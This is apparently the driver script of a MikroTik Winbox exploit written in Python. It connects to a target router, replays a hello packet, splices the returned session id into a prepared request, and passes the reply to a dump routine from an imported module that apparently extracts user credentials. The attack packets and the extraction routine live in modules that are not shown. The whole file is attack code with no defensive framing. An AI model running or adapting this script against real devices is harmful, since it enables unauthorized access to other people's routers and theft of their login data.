#!/usr/bin/env python3

import socket
import sys
from extract_user import dump
from config import port
from templates import template, hello


if __name__ == "__main__":
    if len(sys.argv) < 2 or (len(sys.argv) == 3 and not str.isdigit(sys.argv[2])) or len(sys.argv) > 3:
        print("Usage: python3 WinboxExploit.py IP_ADDRESS [PORT]")
        exit()

    ip = sys.argv[1]

    if len(sys.argv) == 3:
        port = int(sys.argv[2])

    # Initialize Socket
    connection = socket.socket()
    connection.settimeout(3)
    try:
        connection.connect((ip, port))
    except Exception as error:
        print("Connection error: " + str(error))
        exit()

    # Convert to bytearray for manipulation
    hello = bytearray(hello)
    template = bytearray(template)

    # Send hello and recieve the sesison id
    connection.send(hello)
    try:
        session_id = bytearray(connection.recv(1024))
    except Exception as error:
        print("Connection error: " + str(error))
        exit()

    # Replace the session id in template
    template[19] = session_id[38]

    # Send the edited response
    connection.send(template)
    result = bytearray(connection.recv(1024))

    # Get results
    print("Connected to " + ip + ":" + str(port))
    if len(result[55:]) > 25:
        print("Exploit successful")
        dump(result[55:])
    else:
        print("Exploit failed")
